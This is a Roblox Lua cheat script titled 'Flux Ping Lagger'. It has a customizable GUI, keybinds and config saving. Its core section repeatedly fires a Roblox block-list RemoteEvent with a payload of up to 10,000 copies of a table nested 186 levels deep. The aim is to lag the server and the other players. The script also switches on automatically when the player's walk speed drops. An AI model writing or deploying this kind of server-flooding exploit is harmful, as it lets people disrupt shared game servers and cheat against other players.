-- Bless Ping Lagger + Auto Activate (Flux Style GUI - Exact Overlay)
-- PC + Controller keybind | Customizable | Auto-save | Auto Activate | AntiLag ready

local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local HttpService      = game:GetService("HttpService")
local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")

local plr              = Players.LocalPlayer
local plrGui           = plr:WaitForChild("PlayerGui")

-- ══════════════════════════════════════════════════════════════════════
-- CONFIG & SAVE
-- ══════════════════════════════════════════════════════════════════════
local CONFIG_FILE = "BlessPingLagger_Config.json"

local DEFAULT_CFG = {
    power         = 100000,
    interval      = 0.125,
    keybindKb     = "F",
    keybindGp     = "ButtonY",
    autoActivate  = true,
    antiLag       = false,
    uiSize        = 100,
}

local cfg = {
    power         = DEFAULT_CFG.power,
    interval      = DEFAULT_CFG.interval,
    keybindKb     = DEFAULT_CFG.keybindKb,
    keybindGp     = DEFAULT_CFG.keybindGp,
    autoActivate  = DEFAULT_CFG.autoActivate,
    antiLag       = DEFAULT_CFG.antiLag,
    uiSize        = DEFAULT_CFG.uiSize,
}

local function resolveKb(name)
    if not name or name == "" or name == "None" then return nil end
    local ok, val = pcall(function() return Enum.KeyCode[name] end)
    return (ok and val) or nil
end

local function saveConfig()
    local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
    if ok and encoded and writefile then
        pcall(writefile, CONFIG_FILE, encoded)
    end
end

local function loadConfig()
    if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
    if not ok or type(data) ~= "table" then return end

    cfg.power         = tonumber(data.power) or DEFAULT_CFG.power
    cfg.interval      = tonumber(data.interval) or DEFAULT_CFG.interval
    cfg.keybindKb     = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
    cfg.keybindGp     = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
    cfg.autoActivate  = type(data.autoActivate) == "boolean" and data.autoActivate or DEFAULT_CFG.autoActivate
    cfg.antiLag       = type(data.antiLag) == "boolean" and data.antiLag or DEFAULT_CFG.antiLag
    cfg.uiSize        = tonumber(data.uiSize) or DEFAULT_CFG.uiSize
end

loadConfig()

local active           = false
local listeningFor     = nil
local remote           = nil
local brainrotMode     = false
local lastBrainrotState = false
local manualOverride   = false
local isMinimized      = false

-- ══════════════════════════════════════════════════════════════════════
-- COLOURS
-- ══════════════════════════════════════════════════════════════════════
local C = {
    white    = Color3.fromRGB(255, 255, 255),
    offWhite = Color3.fromRGB(230, 230, 230),
    gray     = Color3.fromRGB(170, 170, 170),
    dark     = Color3.fromRGB(15, 15, 20),
    purple   = Color3.fromRGB(140, 80, 255),
    green    = Color3.fromRGB(80, 255, 120),
    red      = Color3.fromRGB(255, 55, 55),
    yellow   = Color3.fromRGB(255, 210, 80),
    inputBg  = Color3.fromRGB(25, 25, 35),
    toggleOn = Color3.fromRGB(90, 255, 130),
    toggleOff= Color3.fromRGB(55, 55, 65),
}

-- ══════════════════════════════════════════════════════════════════════
-- DESTROY OLD
-- ══════════════════════════════════════════════════════════════════════
for _, kid in pairs(plrGui:GetChildren()) do
    if kid.Name == "BlessPingLaggerGui" or kid.Name == "FluxPingLaggerGui" then
        kid:Destroy()
    end
end

local screen = Instance.new("ScreenGui")
screen.Name           = "FluxPingLaggerGui"
screen.ResetOnSpawn   = false
screen.DisplayOrder   = 15
screen.IgnoreGuiInset = true
screen.Parent         = plrGui

-- ══════════════════════════════════════════════════════════════════════
-- HELPERS
-- ══════════════════════════════════════════════════════════════════════
local function tw(obj, props, t)
    TweenService:Create(obj,
        TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        props):Play()
end

local function makeDraggable(frame)
    local dragging, dragStart, startPos
    frame.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1
        or i.UserInputType == Enum.UserInputType.Touch then
            dragging  = true
            dragStart = i.Position
            startPos  = frame.Position
            i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    frame.InputChanged:Connect(function(i)
        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement
                      or i.UserInputType == Enum.UserInputType.Touch) then
            local d = i.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + d.X,
                startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end)
end

local function isGamepad(kc)
    local n = kc.Name
    return n:sub(1,6)=="Button" or n:sub(1,10)=="Thumbstick"
        or n:sub(1,4)=="DPad" or n=="ButtonSelect" or n=="ButtonStart"
end

local BLACKLISTED = {
    [Enum.KeyCode.Escape]      = true,
    [Enum.KeyCode.LeftControl] = true,
    [Enum.KeyCode.Unknown]     = true,
}

-- ══════════════════════════════════════════════════════════════════════
-- ASSETS
-- ══════════════════════════════════════════════════════════════════════
local ASSET_OPEN   = "rbxassetid://118338031849701"
local ASSET_CLOSED = "rbxassetid://126797538009910"

-- Exact sizes matching the design
local OPEN_W, OPEN_H     = 260, 410
local CLOSED_W, CLOSED_H = 260, 85

local function getScale()
    return math.clamp(cfg.uiSize / 100, 0.65, 1.4)
end

-- ══════════════════════════════════════════════════════════════════════
-- MAIN FRAME
-- ══════════════════════════════════════════════════════════════════════
local mainFrame = Instance.new("ImageLabel")
mainFrame.Name                   = "MainFrame"
mainFrame.Size                   = UDim2.new(0, OPEN_W, 0, OPEN_H)
mainFrame.Position               = UDim2.new(0.5, -OPEN_W/2, 0.5, -OPEN_H/2)
mainFrame.BackgroundTransparency = 1
mainFrame.Image                  = ASSET_OPEN
mainFrame.ScaleType              = Enum.ScaleType.Stretch
mainFrame.Active                 = true
mainFrame.ClipsDescendants       = true
mainFrame.Parent                 = screen

makeDraggable(mainFrame)

-- Content container (open state)
local content = Instance.new("Frame")
content.Name                   = "Content"
content.Size                   = UDim2.new(1, 0, 1, 0)
content.BackgroundTransparency = 1
content.Parent                 = mainFrame

-- Closed content (only header elements)
local closedContent = Instance.new("Frame")
closedContent.Name                   = "ClosedContent"
closedContent.Size                   = UDim2.new(1, 0, 1, 0)
closedContent.BackgroundTransparency = 1
closedContent.Visible                = false
closedContent.Parent                 = mainFrame

-- ══════════════════════════════════════════════════════════════════════
-- OPEN STATE ELEMENTS (exact overlay positions)
-- ══════════════════════════════════════════════════════════════════════

-- Title
local titleLbl = Instance.new("TextLabel")
titleLbl.Size                   = UDim2.new(0.72, 0, 0, 20)
titleLbl.Position               = UDim2.new(0.06, 0, 0.018, 0)
titleLbl.BackgroundTransparency = 1
titleLbl.Text                   = "FLUX PING LAGGER"
titleLbl.TextColor3             = C.white
titleLbl.Font                   = Enum.Font.GothamBlack
titleLbl.TextSize               = 13
titleLbl.TextXAlignment         = Enum.TextXAlignment.Left
titleLbl.Parent                 = content

-- Minimize button (-)
local minBtn = Instance.new("TextButton")
minBtn.Name                     = "MinBtn"
minBtn.Size                     = UDim2.new(0, 26, 0, 26)
minBtn.Position                 = UDim2.new(1, -34, 0.015, 0)
minBtn.BackgroundColor3         = Color3.fromRGB(35, 35, 45)
minBtn.BackgroundTransparency   = 0.4
minBtn.BorderSizePixel          = 0
minBtn.Text                     = "-"
minBtn.TextColor3               = C.white
minBtn.Font                     = Enum.Font.GothamBlack
minBtn.TextSize                 = 18
minBtn.AutoButtonColor          = false
minBtn.ZIndex                   = 5
minBtn.Parent                   = content
Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 6)

-- UI SIZE label
local uiSizeLbl = Instance.new("TextLabel")
uiSizeLbl.Size                   = UDim2.new(0.28, 0, 0, 16)
uiSizeLbl.Position               = UDim2.new(0.06, 0, 0.078, 0)
uiSizeLbl.BackgroundTransparency = 1
uiSizeLbl.Text                   = "UI SIZE"
uiSizeLbl.TextColor3             = C.offWhite
uiSizeLbl.Font                   = Enum.Font.GothamBold
uiSizeLbl.TextSize               = 11
uiSizeLbl.TextXAlignment         = Enum.TextXAlignment.Left
uiSizeLbl.Parent                 = content

-- UI SIZE value
local uiSizeValue = Instance.new("TextLabel")
uiSizeValue.Name                 = "UISizeValue"
uiSizeValue.Size                 = UDim2.new(0, 36, 0, 16)
uiSizeValue.Position             = UDim2.new(0.34, 0, 0.078, 0)
uiSizeValue.BackgroundTransparency = 1
uiSizeValue.Text                 = tostring(cfg.uiSize)
uiSizeValue.TextColor3           = C.white
uiSizeValue.Font                 = Enum.Font.GothamBold
uiSizeValue.TextSize             = 12
uiSizeValue.Parent               = content

-- UI SIZE -
local uiMinus = Instance.new("TextButton")
uiMinus.Size                     = UDim2.new(0, 22, 0, 22)
uiMinus.Position                 = UDim2.new(0.50, 0, 0.072, 0)
uiMinus.BackgroundColor3         = Color3.fromRGB(40, 40, 55)
uiMinus.BackgroundTransparency   = 0.3
uiMinus.BorderSizePixel          = 0
uiMinus.Text                     = "-"
uiMinus.TextColor3               = C.white
uiMinus.Font                     = Enum.Font.GothamBlack
uiMinus.TextSize                 = 15
uiMinus.AutoButtonColor          = false
uiMinus.Parent                   = content
Instance.new("UICorner", uiMinus).CornerRadius = UDim.new(0, 5)

-- UI SIZE +
local uiPlus = Instance.new("TextButton")
uiPlus.Size                      = UDim2.new(0, 22, 0, 22)
uiPlus.Position                  = UDim2.new(0.60, 0, 0.072, 0)
uiPlus.BackgroundColor3          = Color3.fromRGB(40, 40, 55)
uiPlus.BackgroundTransparency    = 0.3
uiPlus.BorderSizePixel           = 0
uiPlus.Text                      = "+"
uiPlus.TextColor3                = C.white
uiPlus.Font                      = Enum.Font.GothamBlack
uiPlus.TextSize                  = 15
uiPlus.AutoButtonColor           = false
uiPlus.Parent                    = content
Instance.new("UICorner", uiPlus).CornerRadius = UDim.new(0, 5)

-- Keybind display (top right)
local keybindDisplay = Instance.new("TextLabel")
keybindDisplay.Name                 = "KeybindDisplay"
keybindDisplay.Size                 = UDim2.new(0, 70, 0, 18)
keybindDisplay.Position             = UDim2.new(1, -100, 0.078, 0)
keybindDisplay.BackgroundTransparency = 1
keybindDisplay.Text                 = cfg.keybindGp ~= "None" and cfg.keybindGp or (cfg.keybindKb ~= "None" and cfg.keybindKb or "None")
keybindDisplay.TextColor3           = C.yellow
keybindDisplay.Font                 = Enum.Font.GothamBold
keybindDisplay.TextSize             = 11
keybindDisplay.TextXAlignment       = Enum.TextXAlignment.Right
keybindDisplay.Parent               = content

-- Discord
local discordLbl = Instance.new("TextLabel")
discordLbl.Size                   = UDim2.new(0.7, 0, 0, 14)
discordLbl.Position               = UDim2.new(0.06, 0, 0.125, 0)
discordLbl.BackgroundTransparency = 1
discordLbl.Text                   = "discord.gg/fluxhub"
discordLbl.TextColor3             = C.gray
discordLbl.Font                   = Enum.Font.Gotham
discordLbl.TextSize               = 10
discordLbl.TextXAlignment         = Enum.TextXAlignment.Left
discordLbl.Parent                 = content

-- ── POWER ──
local powerLbl = Instance.new("TextLabel")
powerLbl.Size                   = UDim2.new(0.4, 0, 0, 14)
powerLbl.Position               = UDim2.new(0.06, 0, 0.175, 0)
powerLbl.BackgroundTransparency = 1
powerLbl.Text                   = "POWER"
powerLbl.TextColor3             = C.offWhite
powerLbl.Font                   = Enum.Font.GothamBold
powerLbl.TextSize               = 11
powerLbl.TextXAlignment         = Enum.TextXAlignment.Left
powerLbl.Parent                 = content

local powerBox = Instance.new("TextBox")
powerBox.Name                     = "PowerBox"
powerBox.Size                     = UDim2.new(0.88, 0, 0, 30)
powerBox.Position                 = UDim2.new(0.06, 0, 0.210, 0)
powerBox.BackgroundColor3         = C.inputBg
powerBox.BackgroundTransparency   = 0.25
powerBox.BorderSizePixel          = 0
powerBox.Text                     = tostring(cfg.power)
powerBox.TextColor3               = C.white
powerBox.Font                     = Enum.Font.GothamBold
powerBox.TextSize                 = 14
powerBox.ClearTextOnFocus         = false
powerBox.Parent                   = content
Instance.new("UICorner", powerBox).CornerRadius = UDim.new(0, 8)

-- ── DELAY ──
local delayLbl = Instance.new("TextLabel")
delayLbl.Size                   = UDim2.new(0.4, 0, 0, 14)
delayLbl.Position               = UDim2.new(0.06, 0, 0.300, 0)
delayLbl.BackgroundTransparency = 1
delayLbl.Text                   = "DELAY"
delayLbl.TextColor3             = C.offWhite
delayLbl.Font                   = Enum.Font.GothamBold
delayLbl.TextSize               = 11
delayLbl.TextXAlignment         = Enum.TextXAlignment.Left
delayLbl.Parent                 = content

local delayBox = Instance.new("TextBox")
delayBox.Name                     = "DelayBox"
delayBox.Size                     = UDim2.new(0.88, 0, 0, 30)
delayBox.Position                 = UDim2.new(0.06, 0, 0.335, 0)
delayBox.BackgroundColor3         = C.inputBg
delayBox.BackgroundTransparency   = 0.25
delayBox.BorderSizePixel          = 0
delayBox.Text                     = tostring(cfg.interval)
delayBox.TextColor3               = C.white
delayBox.Font                     = Enum.Font.GothamBold
delayBox.TextSize                 = 14
delayBox.ClearTextOnFocus         = false
delayBox.Parent                   = content
Instance.new("UICorner", delayBox).CornerRadius = UDim.new(0, 8)

-- ── TOGGLE HELPER ──
local function makeToggle(parent, name, yPos, initial, onToggle)
    local row = Instance.new("Frame")
    row.Name                     = name .. "Row"
    row.Size                     = UDim2.new(0.88, 0, 0, 26)
    row.Position                 = UDim2.new(0.06, 0, yPos, 0)
    row.BackgroundTransparency   = 1
    row.Parent                   = parent

    local lbl = Instance.new("TextLabel")
    lbl.Size                     = UDim2.new(0.62, 0, 1, 0)
    lbl.BackgroundTransparency   = 1
    lbl.Text                     = name
    lbl.TextColor3               = C.offWhite
    lbl.Font                     = Enum.Font.GothamBold
    lbl.TextSize                 = 12
    lbl.TextXAlignment           = Enum.TextXAlignment.Left
    lbl.Parent                   = row

    local track = Instance.new("Frame")
    track.Name                   = "Track"
    track.Size                   = UDim2.new(0, 44, 0, 22)
    track.Position               = UDim2.new(1, -44, 0.5, -11)
    track.BackgroundColor3       = initial and C.toggleOn or C.toggleOff
    track.BorderSizePixel        = 0
    track.Parent                 = row
    Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)

    local knob = Instance.new("Frame")
    knob.Name                    = "Knob"
    knob.Size                    = UDim2.new(0, 18, 0, 18)
    knob.Position                = initial and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9)
    knob.BackgroundColor3        = C.white
    knob.BorderSizePixel         = 0
    knob.Parent                  = track
    Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

    local btn = Instance.new("TextButton")
    btn.Size                     = UDim2.new(1, 0, 1, 0)
    btn.BackgroundTransparency   = 1
    btn.Text                     = ""
    btn.Parent                   = track

    local state = initial
    btn.MouseButton1Click:Connect(function()
        state = not state
        tw(track, {BackgroundColor3 = state and C.toggleOn or C.toggleOff}, 0.12)
        tw(knob, {Position = state and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9)}, 0.12)
        onToggle(state)
    end)

    return {
        set = function(v)
            state = v
            track.BackgroundColor3 = v and C.toggleOn or C.toggleOff
            knob.Position = v and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9)
        end,
        get = function() return state end
    }
end

local autoToggle = makeToggle(content, "AUTO ACTIVATE", 0.430, cfg.autoActivate, function(v)
    cfg.autoActivate = v
    saveConfig()
end)

local antiLagToggle = makeToggle(content, "ANTILAG", 0.505, cfg.antiLag, function(v)
    cfg.antiLag = v
    saveConfig()
    -- AntiLag code will be added here later
end)

-- ── BACKGROUND ──
local bgLbl = Instance.new("TextLabel")
bgLbl.Size                   = UDim2.new(0.5, 0, 0, 14)
bgLbl.Position               = UDim2.new(0.06, 0, 0.580, 0)
bgLbl.BackgroundTransparency = 1
bgLbl.Text                   = "BACKGROUND"
bgLbl.TextColor3             = C.offWhite
bgLbl.Font                   = Enum.Font.GothamBold
bgLbl.TextSize               = 11
bgLbl.TextXAlignment         = Enum.TextXAlignment.Left
bgLbl.Parent                 = content

local bgBtn = Instance.new("TextButton")
bgBtn.Size                     = UDim2.new(0.88, 0, 0, 26)
bgBtn.Position                 = UDim2.new(0.06, 0, 0.615, 0)
bgBtn.BackgroundColor3         = C.inputBg
bgBtn.BackgroundTransparency   = 0.25
bgBtn.BorderSizePixel          = 0
bgBtn.Text                     = "  Default  ▼"
bgBtn.TextColor3               = C.white
bgBtn.Font                     = Enum.Font.Gotham
bgBtn.TextSize                 = 12
bgBtn.TextXAlignment           = Enum.TextXAlignment.Left
bgBtn.AutoButtonColor          = false
bgBtn.Parent                   = content
Instance.new("UICorner", bgBtn).CornerRadius = UDim.new(0, 7)

-- ── BIG OFF / ON BUTTON ──
local mainBtn = Instance.new("TextButton")
mainBtn.Name                     = "MainToggle"
mainBtn.Size                     = UDim2.new(0.88, 0, 0, 40)
mainBtn.Position                 = UDim2.new(0.06, 0, 0.710, 0)
mainBtn.BackgroundColor3         = Color3.fromRGB(45, 45, 55)
mainBtn.BackgroundTransparency   = 0.15
mainBtn.BorderSizePixel          = 0
mainBtn.Text                     = "KAPALI"
mainBtn.TextColor3               = C.red
mainBtn.Font                     = Enum.Font.GothamBlack
mainBtn.TextSize                 = 16
mainBtn.AutoButtonColor          = false
mainBtn.Parent                   = content
Instance.new("UICorner", mainBtn).CornerRadius = UDim.new(0, 10)
local mainBtnStroke = Instance.new("UIStroke", mainBtn)
mainBtnStroke.Color        = C.red
mainBtnStroke.Thickness    = 1.4
mainBtnStroke.Transparency = 0.25

-- ── SAVE CONFIG ──
local saveBtn = Instance.new("TextButton")
saveBtn.Name                     = "SaveConfig"
saveBtn.Size                     = UDim2.new(0.88, 0, 0, 30)
saveBtn.Position                 = UDim2.new(0.06, 0, 0.830, 0)
saveBtn.BackgroundColor3         = Color3.fromRGB(40, 40, 55)
saveBtn.BackgroundTransparency   = 0.2
saveBtn.BorderSizePixel          = 0
saveBtn.Text                     = "SAVE CONFIG"
saveBtn.TextColor3               = C.white
saveBtn.Font                     = Enum.Font.GothamBold
saveBtn.TextSize                 = 12
saveBtn.AutoButtonColor          = false
saveBtn.Parent                   = content
Instance.new("UICorner", saveBtn).CornerRadius = UDim.new(0, 8)

-- ══════════════════════════════════════════════════════════════════════
-- CLOSED STATE ELEMENTS (exact like the small photo)
-- ══════════════════════════════════════════════════════════════════════
local cTitle = Instance.new("TextLabel")
cTitle.Size                   = UDim2.new(0.7, 0, 0, 18)
cTitle.Position               = UDim2.new(0.06, 0, 0.12, 0)
cTitle.BackgroundTransparency = 1
cTitle.Text                   = "FLUX PING LAGGER"
cTitle.TextColor3             = C.white
cTitle.Font                   = Enum.Font.GothamBlack
cTitle.TextSize               = 12
cTitle.TextXAlignment         = Enum.TextXAlignment.Left
cTitle.Parent                 = closedContent

local cUiLbl = Instance.new("TextLabel")
cUiLbl.Size                   = UDim2.new(0.28, 0, 0, 14)
cUiLbl.Position               = UDim2.new(0.06, 0, 0.42, 0)
cUiLbl.BackgroundTransparency = 1
cUiLbl.Text                   = "UI SIZE"
cUiLbl.TextColor3             = C.offWhite
cUiLbl.Font                   = Enum.Font.GothamBold
cUiLbl.TextSize               = 10
cUiLbl.TextXAlignment         = Enum.TextXAlignment.Left
cUiLbl.Parent                 = closedContent

local cUiVal = Instance.new("TextLabel")
cUiVal.Size                   = UDim2.new(0, 30, 0, 14)
cUiVal.Position               = UDim2.new(0.32, 0, 0.42, 0)
cUiVal.BackgroundTransparency = 1
cUiVal.Text                   = tostring(cfg.uiSize)
cUiVal.TextColor3             = C.white
cUiVal.Font                   = Enum.Font.GothamBold
cUiVal.TextSize               = 11
cUiVal.Parent                 = closedContent

local cPlus = Instance.new("TextButton")
cPlus.Size                     = UDim2.new(0, 22, 0, 22)
cPlus.Position                 = UDim2.new(1, -34, 0.12, 0)
cPlus.BackgroundColor3         = Color3.fromRGB(40, 40, 55)
cPlus.BackgroundTransparency   = 0.3
cPlus.BorderSizePixel          = 0
cPlus.Text                     = "+"
cPlus.TextColor3               = C.white
cPlus.Font                     = Enum.Font.GothamBlack
cPlus.TextSize                 = 15
cPlus.AutoButtonColor          = false
cPlus.ZIndex                   = 5
cPlus.Parent                   = closedContent
Instance.new("UICorner", cPlus).CornerRadius = UDim.new(0, 5)

local cDiscord = Instance.new("TextLabel")
cDiscord.Size                   = UDim2.new(0.6, 0, 0, 12)
cDiscord.Position               = UDim2.new(0.06, 0, 0.68, 0)
cDiscord.BackgroundTransparency = 1
cDiscord.Text                   = "discord.gg/fluxhub"
cDiscord.TextColor3             = C.gray
cDiscord.Font                   = Enum.Font.Gotham
cDiscord.TextSize               = 9
cDiscord.TextXAlignment         = Enum.TextXAlignment.Left
cDiscord.Parent                 = closedContent

local cKeybind = Instance.new("TextLabel")
cKeybind.Size                   = UDim2.new(0, 65, 0, 14)
cKeybind.Position               = UDim2.new(1, -95, 0.42, 0)
cKeybind.BackgroundTransparency = 1
cKeybind.Text                   = cfg.keybindGp ~= "None" and cfg.keybindGp or (cfg.keybindKb ~= "None" and cfg.keybindKb or "None")
cKeybind.TextColor3             = C.yellow
cKeybind.Font                   = Enum.Font.GothamBold
cKeybind.TextSize               = 10
cKeybind.TextXAlignment         = Enum.TextXAlignment.Right
cKeybind.Parent                 = closedContent

-- ══════════════════════════════════════════════════════════════════════
-- UI SIZE + MINIMIZE LOGIC
-- ══════════════════════════════════════════════════════════════════════
local function applyUISize()
    local s = getScale()
    if isMinimized then
        mainFrame.Size = UDim2.new(0, CLOSED_W * s, 0, CLOSED_H * s)
    else
        mainFrame.Size = UDim2.new(0, OPEN_W * s, 0, OPEN_H * s)
    end
    uiSizeValue.Text = tostring(cfg.uiSize)
    cUiVal.Text = tostring(cfg.uiSize)
end

uiMinus.MouseButton1Click:Connect(function()
    cfg.uiSize = math.max(60, cfg.uiSize - 5)
    applyUISize()
    saveConfig()
end)

uiPlus.MouseButton1Click:Connect(function()
    cfg.uiSize = math.min(150, cfg.uiSize + 5)
    applyUISize()
    saveConfig()
end)

local function setMinimized(state)
    isMinimized = state
    if state then
        mainFrame.Image = ASSET_CLOSED
        content.Visible = false
        closedContent.Visible = true
    else
        mainFrame.Image = ASSET_OPEN
        content.Visible = true
        closedContent.Visible = false
    end
    applyUISize()
end

minBtn.MouseButton1Click:Connect(function()
    setMinimized(true)
end)

cPlus.MouseButton1Click:Connect(function()
    setMinimized(false)
end)

-- ══════════════════════════════════════════════════════════════════════
-- INPUT HANDLERS
-- ══════════════════════════════════════════════════════════════════════
powerBox.FocusLost:Connect(function()
    local n = tonumber(powerBox.Text)
    if n then
        cfg.power = math.max(1, math.floor(n))
        powerBox.Text = tostring(cfg.power)
        saveConfig()
    else
        powerBox.Text = tostring(cfg.power)
    end
end)

delayBox.FocusLost:Connect(function()
    local n = tonumber(delayBox.Text)
    if n then
        cfg.interval = math.max(0.01, n)
        delayBox.Text = tostring(cfg.interval)
        saveConfig()
    else
        delayBox.Text = tostring(cfg.interval)
    end
end)

saveBtn.MouseButton1Click:Connect(function()
    saveConfig()
    local old = saveBtn.Text
    saveBtn.Text = "SAVED!"
    task.delay(0.7, function()
        if saveBtn then saveBtn.Text = old end
    end)
end)

-- ══════════════════════════════════════════════════════════════════════
-- PING LAGGER CORE
-- ══════════════════════════════════════════════════════════════════════
local function findRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local r
    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
        local found = rrs:FindFirstChild(name)
        if found and found:IsA("RemoteEvent") then r = found break end
    end
    if not r then
        for _, c in ipairs(rrs:GetChildren()) do
            if c:IsA("RemoteEvent") and c.Name:find("Block") then r = c break end
        end
    end
    return r
end

remote = findRemote()

local function buildPayload(power)
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, 186 do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor(power / 188), 10000)
    for _ = 1, maxRep do
        table.insert(main, nested)
    end
    return main
end

local function runPingLoop()
    local delay = cfg.interval
    while active and remote do
        local payload = buildPayload(cfg.power)
        local ok = pcall(function() remote:FireServer(payload) end)
        if not ok then
            delay = math.min(delay * 1.5, 0.5)
        else
            delay = math.max(delay * 0.995, 0.05)
        end
        task.wait(delay)
    end
end

local function updateMainButton()
    if active then
        mainBtn.Text = "AÇIK"
        mainBtn.TextColor3 = C.green
        mainBtnStroke.Color = C.green
    else
        mainBtn.Text = "KAPALI"
        mainBtn.TextColor3 = C.red
        mainBtnStroke.Color = C.red
    end
end

local function flipLag(state, isManual)
    active = state
    if isManual then
        if brainrotMode then
            manualOverride = not state
        else
            manualOverride = false
        end
    end
    if active then
        if not remote then
            remote = findRemote()
            if not remote then
                active = false
                updateMainButton()
                return
            end
        end
        task.spawn(runPingLoop)
    end
    updateMainButton()
end

mainBtn.MouseButton1Click:Connect(function()
    flipLag(not active, true)
end)

-- ══════════════════════════════════════════════════════════════════════
-- AUTO ACTIVATE
-- ══════════════════════════════════════════════════════════════════════
RunService.Heartbeat:Connect(function()
    if not cfg.autoActivate then
        if brainrotMode then
            brainrotMode = false
            lastBrainrotState = false
        end
        return
    end
    local char = plr.Character
    if not char then return end
    local hum = char:FindFirstChild("Humanoid")
    if not hum then return end

    local hasBrainrot = hum.WalkSpeed < 25

    if hasBrainrot and not lastBrainrotState then
        brainrotMode = true
        lastBrainrotState = true
        manualOverride = false
        flipLag(true)
    elseif not hasBrainrot and lastBrainrotState then
        brainrotMode = false
        lastBrainrotState = false
        manualOverride = false
        flipLag(false)
    end
end)

-- ══════════════════════════════════════════════════════════════════════
-- KEYBINDS
-- ══════════════════════════════════════════════════════════════════════
local function updateKeybindDisplay()
    local txt = "None"
    if cfg.keybindGp and cfg.keybindGp ~= "None" then
        txt = cfg.keybindGp
    elseif cfg.keybindKb and cfg.keybindKb ~= "None" then
        txt = cfg.keybindKb
    end
    keybindDisplay.Text = txt
    cKeybind.Text = txt
end

UserInputService.InputBegan:Connect(function(input, processed)
    local kc = input.KeyCode
    if kc == Enum.KeyCode.Unknown then return end

    local isGp = isGamepad(kc)
    local isKb = input.UserInputType == Enum.UserInputType.Keyboard

    if listeningFor then
        if kc == Enum.KeyCode.Escape then
            listeningFor = nil
            updateKeybindDisplay()
            return
        end
        if listeningFor == "kb" and isKb and not BLACKLISTED[kc] then
            cfg.keybindKb = kc.Name
            listeningFor = nil
            updateKeybindDisplay()
            saveConfig()
            return
        end
        if listeningFor == "gp" and isGp then
            cfg.keybindGp = kc.Name
            listeningFor = nil
            updateKeybindDisplay()
            saveConfig()
            return
        end
        return
    end

    if processed then return end

    if kc == Enum.KeyCode.LeftControl then
        mainFrame.Visible = not mainFrame.Visible
        return
    end

    local kbEnum = resolveKb(cfg.keybindKb)
    local gpEnum = resolveKb(cfg.keybindGp)

    if (kbEnum and kc == kbEnum and isKb)
    or (gpEnum and kc == gpEnum and isGp) then
        flipLag(not active, true)
    end
end)

-- Init
applyUISize()
updateKeybindDisplay()
updateMainButton()
autoToggle.set(cfg.autoActivate)
antiLagToggle.set(cfg.antiLag)

print("[Flux Ping Lagger] Loaded | Exact Overlay | Auto Activate + AntiLag ready")